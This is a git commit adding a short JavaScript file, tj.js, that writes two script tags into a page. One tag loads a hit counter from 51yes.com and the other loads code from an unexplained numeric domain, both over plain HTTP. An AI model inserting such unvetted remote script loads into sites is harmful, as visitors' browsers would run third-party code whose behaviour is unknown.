9769ec2d7358a04c92cd10a49eb8406e31357e47
js999999999 <js-9@outlook.com>
2016-11-14 20:30:01 +0800

    Create tj.js

---
+++ ajs/tj.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count23.51yes.com\/click.aspx?id=230690602&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.647123.com\/ajs1/t.js ><\/script>");
